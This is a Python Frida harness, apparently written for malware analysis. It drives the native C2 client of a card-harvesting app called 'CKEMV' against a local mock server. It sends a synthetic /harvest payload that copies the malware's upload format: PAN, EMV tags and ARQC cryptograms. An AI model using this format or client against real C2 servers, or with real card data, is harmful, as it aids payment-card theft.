#!/usr/bin/env python3
"""
Drive the CKEMV native C2 client (Reporter JNI) directly via Frida RPC, pointed
at the local mock. Captures the genuine request wire-format (logged by the mock)
and the response handling (logged via Frida send()).

Usage: python drive_c2.py <pid> [mock_url]
All data here is SYNTHETIC analyst test data — no real card material.
"""
import frida
import json
import sys
import time

pid = int(sys.argv[1])
mock = sys.argv[2] if len(sys.argv) > 2 else "http://10.0.2.2:8771"

# Synthetic /harvest body matching CardRecord.toUploadJson() exactly.
HARVEST_BODY = json.dumps({
    "pan": "4111111111111111",
    "aid": "A0000000031010",
    "network": "Visa",
    "tx_count": 2,
    "raw_data": {"5A": "4111111111111111", "57": "4111111111111111D2512", "5F34": "00"},
    "harvested_txs": [
        {"atc": "0001", "arqc": "A1B2C3D4E5F60718", "time_ms": 42.0, "cve_id": 1,
         "params": {"9F02": "000000005000", "9F36": "0001", "9F1A": "0840"}},
        {"atc": "0002", "arqc": "1122334455667788", "time_ms": 40.0, "cve_id": 1,
         "params": {"9F02": "000000004750", "9F36": "0002", "9F1A": "0840"}},
    ],
})

dev = frida.get_usb_device(timeout=15)
session = dev.attach(pid)
script = session.create_script(open("hooks/capture_c2.js").read())


def on_message(m, d):
    if m["type"] == "send":
        print("[send] " + json.dumps(m["payload"]), flush=True)
    elif m["type"] == "error":
        print("[error] " + str(m.get("stack") or m.get("description")), flush=True)


script.on("message", on_message)
script.load()
time.sleep(1)

ex = getattr(script, "exports_sync", None) or script.exports

print("\n=== RPC: fetchCves('TESTKEY123', mock) -> GET /me ===", flush=True)
try:
    print("RET fetchCves: " + str(ex.fetchcves("TESTKEY123", mock)), flush=True)
except Exception as e:
    print("fetchCves raised: " + repr(e), flush=True)

print("\n=== RPC: uploadHarvestData(body, 'TESTKEY123', mock) -> POST /harvest ===", flush=True)
try:
    print("RET upload: " + str(ex.upload(HARVEST_BODY, "TESTKEY123", mock)), flush=True)
except Exception as e:
    print("upload raised: " + repr(e), flush=True)

print("\n=== RPC: fetchReport('TESTKEY123', mock) -> GET /report ===", flush=True)
try:
    print("RET fetchReport: " + str(ex.fetchreport("TESTKEY123", mock)), flush=True)
except Exception as e:
    print("fetchReport raised: " + repr(e), flush=True)

time.sleep(1)
session.detach()
print("\n[done]", flush=True)
